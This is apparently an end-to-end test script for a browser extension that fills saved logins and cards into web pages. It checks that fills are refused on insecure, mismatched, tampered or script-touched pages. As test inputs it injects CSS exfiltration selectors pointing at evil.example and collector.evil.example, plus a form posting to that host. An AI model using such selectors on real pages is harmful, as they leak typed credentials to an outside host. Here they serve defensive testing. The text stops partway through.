// Filling logins, cards and details from the vault into web pages — end to end, with nothing mocked between the
// tool and the page field but the browser itself:
//
//   the engine's tools (tools/browser-fill.ts, tools/browser.ts) → the real bridge (services/browser-bridge.ts)
//   → a real socket → the REAL extension service worker (extension/background.js) running under a pretend Chrome
//   (fixtures/browser/fake-chrome.mjs) → the real page code (extension/page.js) in mini-DOM pages built from the
//   fixture pages (fixtures/browser/*.html).
//
// Part 1: the page-side code on the fixture pages (fixtures/browser/page-tests.mts).
// Part 2: the service worker: pairing from the popup, single-flight connect, 4401 / 4409, a rogue engine, Trinity's
//         own tabs, every check a fill passes before a character is typed, what a tab that holds a fill refuses.
// Part 3: the tools against an in-memory vault: sign-in with one login, none (the secure form, then on), several;
//         a host the login isn't saved for; sign-in in steps; one-time codes; a card needs the yes and uses a
//         one-time security code once; the spending guard for clicks, Enter and "type … and submit".
// Part 4: the same sign-in through the engine's real vault, when it can be used here.
// Last:   the canary — every secret value used above, searched for in everything that can be observed.
//
//   TRINITY_DATA_DIR=<fresh folder> DOTENV_CONFIG_PATH=<empty file> TRINITY_API_KEY=test-key npx tsx scripts/test-browser-fill.mts
import crypto from "node:crypto";
import fs from "node:fs";
import { createServer } from "node:http";
import os from "node:os";
import path from "node:path";
import { WebSocketServer } from "ws";

const RUN = process.env.TRINITY_DATA_DIR ? path.resolve(process.env.TRINITY_DATA_DIR) : fs.mkdtempSync(path.join(os.tmpdir(), "trinity-fill-"));
fs.mkdirSync(RUN, { recursive: true });
process.env.TRINITY_DATA_DIR = RUN;
if (!process.env.DOTENV_CONFIG_PATH) {
  process.env.DOTENV_CONFIG_PATH = path.join(RUN, "empty.env");
  fs.writeFileSync(process.env.DOTENV_CONFIG_PATH, "");
}
process.env.TRINITY_API_KEY = "test-key";
process.env.TRINITY_AUTH = ""; // (the vault stays shut when sign-in checks are off)
// No model and no network in this suite: names match by themselves, and nothing here may call out.
for (const k of ["MORDIEM_API_KEY", "MORPH_API_KEY", "TYPESAFE_API_KEY", "TAVILY_API_KEY", "SERPAPI_KEY", "FAL_KEY", "DEEPGRAM_API_KEY", "PERSONAPLEX_WS_URL"]) process.env[k] = "";
globalThis.fetch = (async (url: unknown) => {
  throw new Error(`no network in this suite (${String(url).slice(0, 60)})`);
}) as typeof fetch;

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
const until = async (cond: () => boolean, ms = 4000) => {
  const end = Date.now() + ms;
  while (!cond() && Date.now() < end) await sleep(20);
  return cond();
};
let fails = 0;
let passes = 0;
const J = (v: unknown) => JSON.stringify(v);
// This suite's own report goes straight out; everything the engine and the extension print is kept, for the canary.
const report = console.log.bind(console);
const check = (name: string, ok: boolean, detail = "") => {
  if (ok) passes++;
  else fails++;
  report(`${ok ? "PASS" : "FAIL"} ${name}${detail ? `  — ${detail.slice(0, 500)}` : ""}`);
};
const logged: string[] = [];
for (const level of ["log", "warn", "error", "info", "debug"] as const) {
  const real = console[level].bind(console);
  console[level] = (...args: unknown[]) => {
    logged.push(args.map((a) => (typeof a === "string" ? a : a instanceof Error ? `${a.message}\n${a.stack ?? ""}` : J(a))).join(" "));
    real(...args);
  };
}

// ════════════════════════════════════════════════════════════════════════════════════════
report("── Part 1: the page-side code on the fixture pages ──");
const { runPageTests } = await import("./fixtures/browser/page-tests.mts");
await runPageTests(check);

// ════════════════════════════════════════════════════════════════════════════════════════
console.log("\n── Part 2: the service worker, under a pretend Chrome, against the real bridge ──");
const bridge = await import("../server/src/services/browser-bridge.ts");
const { registerBrowserTools } = await import("../server/src/tools/browser.ts");
const fillTools = await import("../server/src/tools/browser-fill.ts");
const { getTools } = await import("../server/src/tools/registry.ts");
const { answerPending, pendingQuestion, dropPending } = await import("../server/src/agent/pending.ts");
const { act, recentResults } = await import("../server/src/agent/act.ts");
const { visibleTools } = await import("../server/src/agent/router.ts");
const { contextFor } = await import("../server/src/agent/context.ts");
const { workspace } = await import("../server/src/workspace/bus.ts");
const { createFakeBrowser } = await import("./fixtures/browser/fake-chrome.mjs");
const { FakeExtension } = await import("./fixtures/browser/fake-extension.mjs");
registerBrowserTools();
fillTools.registerBrowserFillTools();

const server = createServer();
server.on("upgrade", (req, sock, head) => bridge.handleBrowserUpgrade(req, sock, head));
await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
const port = (server.address() as { port: number }).port;
const ENGINE = `ws://127.0.0.1:${port}`;
const shares: { kind: string; title: string }[] = [];
bridge.onBrowserShare((s: { kind: string; title: string }) => shares.push(s));
const busEvents: unknown[] = [];
workspace.subscribe((e: unknown) => busEvents.push(e));

type Field = { value: string; localName: string; _ga(n: string): string | null; setAttribute(n: string, v: string): void; removeAttribute(n: string): void; addEventListener(t: string, fn: (e: { preventDefault(): void }) => void): void; focus(): void; checked?: boolean };
const b = createFakeBrowser({ engine: ENGINE });
const el = (tabId: number, id: string): Field => b.page(tabId).document._flat().find((e: Field) => e._ga("id") === id) as Field;
const fieldsOf = (tabId: number): Field[] => b.page(tabId).document._flat().filter((e: Field) => /^(input|select|textarea)$/.test(e.localName));
const valuesOf = (tabId: number) => Object.fromEntries(fieldsOf(tabId).filter((f) => f.value && f._ga("type") !== "hidden" && f._ga("type") !== "checkbox").map((f) => [f._ga("id") ?? f._ga("name"), f.value]));
const submitsOf = (tabId: number) => b.page(tabId).document._submits as { form: Field; prevented: boolean }[];
const calledOf = (method: string) => b.log.sockets.flatMap((s: { received: string[] }) => s.received).filter((t: string) => t.includes(`"method":"${method}"`)).length;

// A worker that wakes with what an earlier one left in session storage — Chrome stops and restarts service workers.
const styled = b.openTab("https://styled.example/", "<!doctype html><html><head><title>Styled</title></head><body><p>styled</p></body></html>");
b.tab(styled.id).css.push("html{filter:invert(1)}");
b.storage.session.data.injected = { [styled.id]: { dark: "html{filter:invert(1)}" } };
const held = b.openFixture("login.html", "https://held.example/login");
b.storage.session.data.filled = { [held.id]: "https://held.example" };
// Trinity's own page is the app's (Vite, WEB_PORT): the engine's own address serves no pages and isn't one of hers.
const OWN_PAGE = `http://localhost:${Number(process.env.WEB_PORT) || 5173}/`;
const ownTab = b.openTab(OWN_PAGE, "<!doctype html><html><head><title>Trinity</title></head><body><button>Hang up</button></body></html>");
const web = b.openFixture("login.html", "https://www.acme.example/login");
b.install();
await import("../extension/background.js");
await sleep(150);

let st = await b.popup({ type: "status" });
check("worker: not paired → no socket is opened, and the popup says so", st.status.state === "unpaired" && st.paired === false && b.log.sockets.length === 0, J(st.status));
for (let i = 0; i < 3; i++) b.fireAlarm();
await sleep(100);
check("worker: the keep-alive alarm doesn't dial before pairing", b.log.sockets.length === 0);
// A code typed while the engine has none waiting: the upgrade is turned away before a word is said (403). The engine's
// own page still answers, so the popup is told the code is the trouble — not that Trinity isn't running.
const noNetwork = globalThis.fetch;
const engineHttp = ENGINE.replace(/^ws/, "http");
const healthChecks: string[] = [];
globalThis.fetch = (async (url: unknown) => {
  healthChecks.push(String(url));
  if (String(url) === `${engineHttp}/healthz`) return new Response("{}", { status: 200 });
  throw new Error(`no network in this suite (${String(url).slice(0, 60)})`);
}) as typeof fetch;
const noCode = await b.popup({ type: "pair", code: "ABCD-EFGH" });
check("worker: a code typed when none is waiting — refused, and told it's the code, not that Trinity is down", noCode.outcome === "no-code" && noCode.paired === false && noCode.status.state === "unpaired" && /no pairing code is waiting/.test(noCode.status.detail) && healthChecks.length === 1, J({ noCode, healthChecks }));
globalThis.fetch = noNetwork;
const nobody = await b.popup({ type: "pair", code: "ABCD-EFGH" });
check("worker: …and when nothing answers at the engine's address, that Trinity couldn't be reached", nobody.outcome === "unreachable" && /Couldn't reach Trinity/.test(nobody.status.detail), J(nobody));
let code = bridge.newPairingCode().code as string;
let pr = await b.popup({ type: "pair", code: "ZZZZZZZZ" });
check("worker: a wrong code — the popup is told, nothing is pinned", pr.outcome === "wrong-code" && pr.paired === false && pr.status.state === "unpaired" && /didn't match/.test(pr.status.detail), J(pr));
pr = await b.popup({ type: "pair", code: `${code.slice(0, 4).toLowerCase()} ${code.slice(4)}` });
check("worker: the right code pairs and connects", pr.outcome === "live" && pr.paired === true && pr.status.state === "connected" && bridge.browserConnected(), J(pr));
check("worker: the socket address carries nothing but the path", b.log.sockets.every((s: { url: string }) => s.url === `${ENGINE}/ext`));
check("worker: the key it keeps can't be exported", b.keys().pair.privateKey.extractable === false && (await globalThis.crypto.subtle.exportKey("pkcs8", b.keys().pair.privateKey).then(() => "exported", () => "refused")) === "refused" && typeof b.keys().engine.pub === "string");
check("worker: nothing about the pairing is in chrome.storage — no code, no key", !J(b.storage.local.data).includes(code) && !/pub|key|token/i.test(J(Object.keys(b.storage.local.data))), J(b.storage.local.data));
check("worker: it reported its tabs", bridge.browserState().tabs.length === 4 && bridge.browserState().caps.fill === true);

// Single-flight: many wake-ups, one socket.
for (let i = 0; i < 5; i++) b.fireAlarm();
await Promise.all([b.popup({ type: "connect" }), b.popup({ type: "connect" }), b.popup({ type: "connect" })]);
await sleep(100);
check("worker: five alarms and three Connects later there is still exactly one socket", b.openSockets() === 1 && bridge.browserConnected(), `${b.openSockets()} open of ${b.log.sockets.length}`);

// What an earlier worker left behind still counts.
let r = (await bridge.browserCall("page.restore", { tabId: styled.id, all: true })) as { removed: number };
check("worker: undo removes a style sheet injected before the worker restarted", r.removed === 1 && b.tab(styled.id).css.length === 0 && b.log.css.some((c: { op: string; found: boolean }) => c.op === "remove" && c.found), J(r));
r = (await bridge.browserCall("page.restore", { tabId: styled.id, all: true })) as { removed: number };
check("worker: undo with nothing to undo says zero", r.removed === 0, J(r));
const HOLDS = /holds a login or card Trinity filled in/;
const fails2 = async (method: string, params: Record<string, unknown>) => bridge.browserCall(method, params).then(() => "ran", (e: Error) => e.message);
check("worker: a tab marked as holding a fill (from before the restart) gives no screenshot", HOLDS.test(await fails2("page.capture", { tabId: held.id })) && b.log.captures.length === 0);
check("worker: …runs no injected script", HOLDS.test(await fails2("page.inject", { tabId: held.id, js: "document.title" })));
check("worker: …takes no style sheet that can call out", HOLDS.test(await fails2("page.inject", { tabId: held.id, css: "input[value^=a]{background:url(https://evil.example/a)}" })) && HOLDS.test(await fails2("page.inject", { tabId: held.id, css: "@import 'https://evil.example/x.css';" })));
check("worker: …gives no saved copy", HOLDS.test(await fails2("files.savePage", { tabId: held.id })) && b.log.downloads.length === 0);
check("worker: …but a plain style sheet is fine", (await fails2("page.inject", { tabId: held.id, id: "dark", css: "html{background:#111}" })) === "ran" && b.tab(held.id).css.length === 1);
await bridge.browserCall("page.inject", { tabId: held.id, id: "dark", css: "html{background:#222}" });
const cssOps = b.log.css.filter((c: { tabId: number }) => c.tabId === held.id).map((c: { op: string; css: string }) => `${c.op}:${c.css.slice(-5)}`);
check("worker: the same id again replaces the sheet (the old one is removed first)", cssOps.join(" ") === "insert:#111} remove:#111} insert:#222}" && b.tab(held.id).css.length === 1, cssOps.join(" "));
r = (await bridge.browserCall("page.restore", { tabId: held.id, ids: ["dark"] })) as { removed: number };
check("worker: …and undo leaves nothing behind", r.removed === 1 && b.tab(held.id).css.length === 0);
b.navigate(held.id, "https://held.example/account", "<!doctype html><html><head><title>Account</title></head><body><p>account</p></body></html>");
await sleep(30);
check("worker: moving within the same site keeps the hold", HOLDS.test(await fails2("page.capture", { tabId: held.id })));
b.navigate(held.id, "https://elsewhere.example/", "<!doctype html><html><head><title>Elsewhere</title></head><body><p>elsewhere</p></body></html>");
await sleep(30);
check("worker: leaving for another site lifts it", (await fails2("page.capture", { tabId: held.id })) === "ran" && b.log.captures.length === 1);

// Trinity's own tab.
const OWN = /Trinity's own tab/;
check("worker: Trinity's own tab is never read", OWN.test(await fails2("page.snapshot", { tabId: ownTab.id })));
check("worker: …never acted on, changed or captured", OWN.test(await fails2("page.act", { tabId: ownTab.id, action: "click", ref: 1 })) && OWN.test(await fails2("page.inject", { tabId: ownTab.id, css: "body{}" })) && OWN.test(await fails2("page.capture", { tabId: ownTab.id })));
check("worker: …never navigated or closed", OWN.test(await fails2("tabs.navigate", { tabId: ownTab.id, url: "https://example.com/" })) && OWN.test(await fails2("tabs.close", { tabId: ownTab.id })) && OWN.test(await fails2("tabs.open", { tabId: ownTab.id, where: "current", url: "https://example.com/" })) && b.tab(ownTab.id).url === OWN_PAGE);
const spare = b.openTab("https://spare.example/", undefined, { active: false });
const closed = (await bridge.browserCall("tabs.close", { others: true, keep: web.id })) as { closed: number[] };
check("worker: 'close the others' spares it even when the engine doesn't say to", !closed.closed.includes(ownTab.id) && closed.closed.includes(spare.id) && b.tabs.some((t: { id: number }) => t.id === ownTab.id), J(closed));
check("worker: its window can't be closed", /holds Trinity's own tab/.test(await fails2("windows.close", { windowId: 1 })) && b.tabs.length >= 2);

// ── every check a fill passes before a character is typed ──
const CANARY_PW = "CANARY-pass-Zx81!kq";
const CANARY_USER = "canary.user.7731@example.com";
type FR = { ok: boolean; code?: string; filled?: string[]; missing?: string[]; step?: string };
const probe = async (tabId: number) => (await bridge.browserCall("page.fillProbe", { tabId })) as { ok: boolean; code?: string; documentId: string; origin: string; kinds: string[] };
const fill = (tabId: number, documentId: string, origin: string, values: Record<string, string>) => bridge.browserSecretCall("page.fill", { tabId, documentId, origin, values }) as Promise<FR>;
const login = { username: CANARY_USER, password: CANARY_PW };
const untouched = (tabId: number) => fieldsOf(tabId).every((f) => f.value !== CANARY_PW && f.value !== CANARY_USER);

b.activate(web.id);
let p = await probe(web.id);
check("fill: the probe names the document, the origin and the kinds", p.ok === true && typeof p.documentId === "string" && p.origin === "https://www.acme.example" && p.kinds.includes("password"), J(p));
const insecure = b.openFixture("login.html", "http://www.acme.example/login");
check("fill: an http page isn't even probed", (await probe(insecure.id)).code === "insecure");
let fr = await fill(insecure.id, "DOC-any", "https://www.acme.example", login);
check("fill: a tab that isn't https is refused (insecure), whatever origin the engine names", fr.ok === false && fr.code === "insecure" && untouched(insecure.id), J(fr));
const other = b.openFixture("login.html", "https://www.acme.example.evil.test/login");
const po = await probe(other.id);
fr = await fill(other.id, po.documentId, "https://www.acme.example", login);
check("fill: the tab's own origin must be exactly the one the fill is for (origin-mismatch)", fr.ok === false && fr.code === "origin-mismatch" && untouched(other.id), J(fr));
fr = await fill(ownTab.id, "DOC-any", OWN_PAGE.replace(/^http:/, "https:").replace(/\/$/, ""), login);
check("fill: never Trinity's own tab", fr.ok === false && untouched(ownTab.id), J(fr));
p = await probe(web.id);
b.navigate(web.id, "https://www.acme.example/login", fs.readFileSync(new URL("./fixtures/browser/login.html", import.meta.url), "utf8"));
fr = await fill(web.id, p.documentId, p.origin, login);
check("fill: the document must still be the one that was probed (gone)", fr.ok === false && fr.code === "gone" && untouched(web.id), J(fr));
// What arrives on the socket can be meddled with on the way: the envelope is bound to its call, tab and origin, and to time.
p = await probe(web.id);
const realNow = Date.now;
b.intercept = (msg: { type: string; method?: string }) => {
  if (msg.type === "call" && msg.method === "page.fill") Date.now = () => realNow() + 11_000;
  return undefined;
};
fr = await fill(web.id, p.documentId, p.origin, login);
Date.now = realNow;
check("fill: an envelope older than ten seconds is refused (expired)", fr.ok === false && fr.code === "expired" && untouched(web.id), J(fr));
b.intercept = (msg: { type: string; method?: string; params?: { sealed: { ct: string } } }) => {
  if (msg.type === "call" && msg.method === "page.fill") {
    const raw = Buffer.from(msg.params!.sealed.ct, "base64");
    raw[3] = raw[3]! ^ 0x55;
    msg.params!.sealed.ct = raw.toString("base64");
    return msg;
  }
  return undefined;
};
fr = await fill(web.id, p.documentId, p.origin, login);
check("fill: a changed ciphertext is refused", fr.ok === false && fr.code === "failed" && untouched(web.id), J(fr));
const twinTab = b.openFixture("login.html", "https://www.acme.example/login", { active: false });
const pt = await probe(twinTab.id);
b.intercept = (msg: { type: string; method?: string; params?: { tabId: number; documentId: string } }) => {
  if (msg.type === "call" && msg.method === "page.fill") {
    msg.params!.tabId = twinTab.id; // same origin, another tab
    msg.params!.documentId = pt.documentId;
    return msg;
  }
  return undefined;
};
fr = await fill(web.id, p.documentId, p.origin, login);
check("fill: an envelope sealed for one tab doesn't open for another, even on the same site", fr.ok === false && fr.code === "failed" && untouched(twinTab.id) && untouched(web.id), J(fr));
let captured: Record<string, unknown> | null = null;
b.intercept = (msg: Record<string, unknown>) => {
  if (msg.type === "call" && msg.method === "page.fill") captured = structuredClone(msg);
  return undefined;
};
fr = await fill(web.id, p.documentId, p.origin, login);
b.intercept = null;
check("fill: with every check passed, the values are in the page — and only kinds come back", fr.ok === true && J(fr.filled) === '["username","password"]' && el(web.id, "email").value === CANARY_USER && el(web.id, "password").value === CANARY_PW && !J(fr).includes("CANARY"), J(fr));
check("fill: the envelope on the wire is ciphertext", captured !== null && !J(captured).includes("CANARY") && !J(captured).includes("canary.user"));
el(web.id, "password").value = "";
const before = b.received().length;
b.deliver(captured);
await sleep(150);
check("fill: the same envelope delivered a second time fills nothing", el(web.id, "password").value === "" && before === b.received().length);
check("fill: the tab now holds a fill: no scripts, no screenshots", HOLDS.test(await fails2("page.inject", { tabId: web.id, js: "document.forms[0].password.value" })) && HOLDS.test(await fails2("page.capture", { tabId: web.id })));
const snap = (await bridge.browserCall("page.snapshot", { tabId: web.id })) as { interactive: { name: string }[] };
check("fill: a snapshot of it carries no value", !J(snap).includes("CANARY") && !J(snap).includes("canary.user") && snap.interactive.length > 3);
const plainFill = await bridge.browserCall("page.fill", { tabId: web.id, values: login }).then(() => "sent", (e: Error) => e.message);
check("fill: there is no unsealed way to send values", /browserSecretCall/.test(plainFill) && calledOf("page.fill") === b.log.sockets.flatMap((s: { received: string[] }) => s.received).filter((t: string) => t.includes('"sealed"')).length, plainFill);

// ── the other order: a script (or a style sheet that calls out) first, a fill afterwards ──
const LOGIN_HTML = fs.readFileSync(new URL("./fixtures/browser/login.html", import.meta.url), "utf8");
const scr = b.openFixture("login.html", "https://script.example/login");
const ps0 = await probe(scr.id);
await bridge.browserCall("page.inject", { tabId: scr.id, id: "dark", css: "html{background:#111}" });
const noted = (await bridge.browserCall("page.inject", { tabId: scr.id, id: "note", html: { position: "top", html: '<p id="hello" onclick="x()">hello</p><script>x()</script><form><input name="q" /></form><template><b>t</b></template>' } })) as { html: boolean };
const wrapper = b.page(scr.id).document._flat().find((e: Field) => e._ga("data-trinity") === "html") as { _qsa(sel: string): Field[] } | undefined;
const added = wrapper ? wrapper._qsa("*") : [];
check("worker: markup added through the worker goes in cleaned (the page code as Chrome ships it)", noted.html === true && added.length === 1 && added[0]!._ga("id") === "hello" && added[0]!._ga("onclick") === null, `${J(noted)} ${added.map((e: Field) => e.localName).join(",")}`);
check("scripted: a plain style sheet and static markup leave a page fillable", ps0.ok === true && (await probe(scr.id)).ok === true);
await bridge.browserCall("page.inject", { tabId: scr.id, js: "1+1" });
let pz = await probe(scr.id);
check("scripted: once Trinity ran a script in a document, that document isn't offered for a fill", pz.ok === false && pz.code === "scripted", J(pz));
let sealedSent = calledOf("page.fill");
fr = await fill(scr.id, ps0.documentId, ps0.origin, login);
check("scripted: …and a fill sent for it anyway is refused, with nothing typed", fr.ok === false && fr.code === "scripted" && untouched(scr.id) && calledOf("page.fill") === sealedSent + 1, J(fr));
check("scripted: which documents took a script is kept where a restarted worker finds it", Object.keys((b.storage.session.data.scripted ?? {}) as object).includes(ps0.documentId), J(b.storage.session.data.scripted));
b.navigate(scr.id, "https://script.example/login", LOGIN_HTML);
await sleep(30);
pz = await probe(scr.id);
fr = await fill(scr.id, pz.documentId, pz.origin, login);
check("scripted: a reload gives the tab a new document, and that one is filled", pz.ok === true && pz.documentId !== ps0.documentId && fr.ok === true && el(scr.id, "password").value === CANARY_PW, `${J(pz)} ${J(fr)}`);
const sheet = b.openFixture("login.html", "https://sheet.example/login");
await bridge.browserCall("page.inject", { tabId: sheet.id, id: "x", css: 'input[value^="a"]{background:url(https://collector.evil.example/a)}' });
pz = await probe(sheet.id);
check("scripted: a style sheet that can call out counts the same", pz.ok === false && pz.code === "scripted", J(pz));
const blind = b.openFixture("login.html", "https://blind.example/login");
b.hideDocuments = true;
await bridge.browserCall("page.inject", { tabId: blind.id, js: "1+1" });
b.hideDocuments = false;
b.navigate(blind.id, "https://blind.example/login", LOGIN_HTML);
await sleep(30);
pz = await probe(blind.id);
check("scripted: when Chrome won't say which document took the script, the whole tab is off limits for fills", pz.ok === false && pz.code === "scripted", J(pz));
await bridge.browserCall("tabs.close", { tabId: blind.id });
await bridge.browserCall("tabs.close", { tabId: sheet.id });
await sleep(30);
const leftover = Object.values((b.storage.session.data.scripted ?? {}) as Record<string, number>);
check("scripted: a closed tab's entries are dropped", !leftover.includes(blind.id) && !leftover.includes(sheet.id), J(b.storage.session.data.scripted));

// ── a fill that failed half way, and a filled page brought back out of the tab's history ──
const eater = b.openFixture("login.html", "https://eater.example/login");
for (const id of ["email", "password"]) el(eater.id, id).addEventListener("input", () => void (el(eater.id, id).value = ""));
pz = await probe(eater.id);
fr = await fill(eater.id, pz.documentId, pz.origin, login);
check("held: boxes that empty themselves — nothing is reported as filled", fr.ok === false && fr.code === "no-fields" && untouched(eater.id), J(fr));
check("held: …but something was typed, so the tab is kept under the fill rules all the same", HOLDS.test(await fails2("page.capture", { tabId: eater.id })) && HOLDS.test(await fails2("page.inject", { tabId: eater.id, js: "1+1" })));
const leaky = b.openTab("https://leaky.example/login", fs.readFileSync(new URL("./fixtures/browser/action-elsewhere.html", import.meta.url), "utf8").replaceAll("{{OTHER}}", "https://collector.evil.example").replace(/<form id="home"[\s\S]*?<\/form>/, ""));
pz = await probe(leaky.id);
fr = await fill(leaky.id, pz.documentId, pz.origin, login);
b.log.captures.length = 0;
check("held: a fill stopped before a character was typed leaves the tab as it was", fr.ok === false && fr.code === "form-target" && untouched(leaky.id) && (await fails2("page.capture", { tabId: leaky.id })) === "ran" && b.log.captures.length === 1, J(fr));
const hist = b.openFixture("login.html", "https://history.example/login");
pz = await probe(hist.id);
fr = await fill(hist.id, pz.documentId, pz.origin, login);
const kept = b.keepDocument(hist.id);
b.navigate(hist.id, "https://away.example/", "<!doctype html><html><head><title>Away</title></head><body><p>away</p></body></html>");
await sleep(30);
const awayShot = await fails2("page.capture", { tabId: hist.id });
b.bringBack(hist.id, kept);
await sleep(30);
check("held: a filled page brought back out of the tab's history still holds its fill", fr.ok === true && awayShot === "ran" && el(hist.id, "password").value === CANARY_PW && HOLDS.test(await fails2("page.capture", { tabId: hist.id })) && HOLDS.test(await fails2("page.inject", { tabId: hist.id, js: "document.forms[0].password.value" })) && HOLDS.test(await fails2("files.savePage", { tabId: hist.id })), awayShot);

// ── the rest of what the worker does ──
const bg1 = b.openTab("https://front.example/", undefined);
const bg2 = b.openTab("https://back.example/", undefined, { active: false });
b.log.captures.length = 0;
await bridge.browserCall("page.capture", { tabId: bg2.id });
check("worker: a screenshot of a background tab is of that tab, and the tab in front comes back to the front", b.log.captures[0] === bg2.id && b.tab(bg1.id).active === true && b.tab(bg2.id).active === false, J(b.log.captures));
const linky = b.openTab("https://links.example/", '<!doctype html><html><head><title>Links</title></head><body><a href="https://other.example/report" target="_blank">Open the report</a><button>Plain</button></body></html>');
let ps = (await bridge.browserCall("page.snapshot", { tabId: linky.id })) as { interactive: { ref: number; name: string; frame?: number }[] };
let ar = (await bridge.browserCall("page.act", { tabId: linky.id, action: "click", ref: ps.interactive.find((i) => i.name === "Open the report")!.ref })) as { ok: boolean; opened?: number };
check("worker: a link that wants a new tab is opened by the extension, next to its page", ar.ok === true && typeof ar.opened === "number" && b.log.created.some((c: { url: string; openerTabId: number }) => c.url === "https://other.example/report" && c.openerTabId === linky.id), J(ar));
b.addFrame(linky.id, "https://pay.example/frame", '<!doctype html><html><head><title>Frame</title></head><body><button id="inframe">Check card</button><input name="cardnumber" autocomplete="cc-number" /></body></html>');
ps = (await bridge.browserCall("page.snapshot", { tabId: linky.id })) as typeof ps;
const inFrame = ps.interactive.find((i) => i.name === "Check card");
check("worker: a snapshot reaches into frames (their buttons, never their secret fields)", Boolean(inFrame && inFrame.frame === 1 && inFrame.ref > 1000) && !ps.interactive.some((i) => /card ?number/i.test(i.name)), J(ps.interactive));
ar = (await bridge.browserCall("page.act", { tabId: linky.id, action: "click", ref: inFrame!.ref, frameId: inFrame!.frame })) as typeof ar;
const frameDoc = b.tab(linky.id).frames[0].win.document;
check("worker: …and a ref in a frame is clicked in that frame", ar.ok === true && frameDoc._events.some((e: { type: string }) => e.type === "click"), J(ar));
const stepTab = b.openFixture("two-step.html", "https://steps.example/signin");
setTimeout(() => {
  el(stepTab.id, "step1").setAttribute("hidden", "");
  el(stepTab.id, "step2").removeAttribute("hidden");
}, 400);
let w = (await bridge.browserCall("page.wait", { tabId: stepTab.id, for: "password", timeoutMs: 4000 }, 8000)) as { found: boolean; loaded: boolean };
check("worker: waiting for a password box that appears", w.found === true && w.loaded === true, J(w));
w = (await bridge.browserCall("page.wait", { tabId: stepTab.id, for: "otp", timeoutMs: 600 }, 8000)) as typeof w;
check("worker: …and for one that doesn't, it says so", w.found === false, J(w));
await bridge.browserCall("tabs.pin", { tabId: bg1.id, pinned: true });
await bridge.browserCall("tabs.mute", { tabId: bg1.id, muted: true });
const dup = (await bridge.browserCall("tabs.duplicate", { tabId: bg1.id })) as { id: number; url: string };
check("worker: pin, mute, duplicate", b.tab(bg1.id).pinned === true && b.tab(bg1.id).muted === true && dup.url === "https://front.example/" && dup.id !== bg1.id);
const grouped = (await bridge.browserCall("tabs.group", { tabIds: [bg1.id, bg2.id], title: "Work" })) as { groupId: number; count: number };
check("worker: group and name tabs", grouped.count === 2 && b.tab(bg1.id).groupId === grouped.groupId && b.groups[grouped.groupId].title === "Work");
await bridge.browserCall("tabs.ungroup", { tabIds: [bg1.id] });
check("worker: ungroup", b.tab(bg1.id).groupId === -1);
const idxBefore = b.tab(bg2.id).index;
const mv = (await bridge.browserCall("tabs.move", { tabId: bg2.id, to: "start" })) as { moved: boolean; index: number };
check("worker: move a tab", mv.moved === true && b.tab(bg2.id).index === 0 && idxBefore !== 0, J(mv));
const nw = (await bridge.browserCall("tabs.move", { tabId: bg2.id, to: "new-window" })) as { windowId: number };
check("worker: move a tab into its own window", b.tab(bg2.id).windowId === nw.windowId && nw.windowId !== 1);
const cw = (await bridge.browserCall("windows.close", { windowId: nw.windowId })) as { closed: number };
check("worker: close a window (not Trinity's)", cw.closed === 1 && !b.tabs.some((t: { id: number }) => t.id === bg2.id));
const re = (await bridge.browserCall("tabs.reopen", {})) as { ok: boolean; tab: { url: string } };
check("worker: reopen the tab that was closed last", re.ok === true && re.tab.url === "https://back.example/");
// Back and forward. Chrome refuses its own back when the page to go back to was left without a click or a key in it —
// as every page Trinity navigated away from by voice is. The page's own history still steps there.
const backTab = b.openTab("https://steps.example/two", "<!doctype html><html><head><title>Two</title></head><body><p>two</p></body></html>");
let hr = (await bridge.browserCall("tabs.history", { tabId: backTab.id, action: "back" })) as { ok: boolean };
check("worker: back, where Chrome's own back works, is Chrome's own back", hr.ok === true && J(b.log.history.slice(-1)) === J([{ tabId: backTab.id, step: -1, by: "chrome" }]), J(b.log.history));
b.tab(backTab.id).skipHistory = true;
b.tab(backTab.id).historyTo = { [-1]: "https://steps.example/one" };
hr = (await bridge.browserCall("tabs.history", { tabId: backTab.id, action: "back" })) as { ok: boolean };
check("worker: back, where Chrome skips the page (left without a click), goes there through the page's own history", hr.ok === true && b.log.history.at(-1)?.by === "page" && b.log.history.at(-1)?.step === -1 && b.tab(backTab.id).url === "https://steps.example/one", `${J(b.log.history.slice(-2))} ${b.tab(backTab.id).url}`);
const nowhere = await bridge.browserCall("tabs.history", { tabId: backTab.id, action: "forward" }).then(
  () => "went",
  (err: Error) => err.message,
);
check("worker: …and with no page to step to either way, Chrome's own refusal is what comes back", nowhere === "Cannot find a next page in history." && b.log.history.at(-1)?.by === "page" && b.log.history.at(-1)?.step === 1, nowhere);
const made = (await bridge.browserCall("windows.create", {})) as { windowId: number };
await bridge.browserCall("windows.update", { windowId: made.windowId, state: "minimized" });
check("worker: a new window, minimized", b.windowState[made.windowId] === "minimized" && /stays up/.test(await fails2("windows.update", { windowId: 1, state: "minimized" })));
b.activate(linky.id);
const shared = await b.popup({ type: "share" });
await sleep(100);
check("worker: 'put this page on the board' from the popup reaches the engine", shared.ok === true && shares.some((s) => s.kind === "page" && s.title === "Links"), J(shares));
b.activate(ownTab.id);
const sharedOwn = await b.popup({ type: "share" });
check("worker: …but not Trinity's own page", sharedOwn.ok === false);
// The popup opened in a tab of its own (its address typed into the address bar) is the same page and is answered; code
// running in a web page carries this extension's id too, but a web page's address — it is never answered.
const extId = (globalThis as unknown as { chrome: { runtime: { id: string } } }).chrome.runtime.id;
const popupTab = b.openTab(`chrome-extension://${extId}/popup.html`, "<!doctype html><html><head><title>Trinity</title></head><body><p>popup</p></body></html>");
const inTab = await b.popupInTab({ type: "status" }, popupTab.id);
check("worker: the popup opened in a tab of its own is answered like the bubble", inTab?.status?.state === "connected" && inTab.paired === true, J(inTab?.status));
const pageAsks = await b.fromPage({ type: "disconnect" }, web.id);
const pageStatus = await b.fromPage({ type: "status" }, web.id);
check("worker: a message from code in a web page (this extension's id, the page's address) is never answered", pageAsks === undefined && pageStatus === undefined && bridge.browserConnected() && b.storage.local.data.paused !== true, J({ pageAsks, pageStatus }));
await sleep(5);
b.activate(linky.id);
await sleep(5);
b.activate(popupTab.id);
const sharesBefore = shares.length;
const sharedFromTab = await b.popupInTab({ type: "share" }, popupTab.id);
await sleep(100);
check("worker: 'put this page on the board' from the popup in a tab shares the web page used before it, not the popup", sharedFromTab?.ok === true && shares.length === sharesBefore + 1 && shares.at(-1)?.title === "Links", J(shares.slice(sharesBefore)));

// ── 4409: another copy of the extension takes the link ──
const k = b.keys();
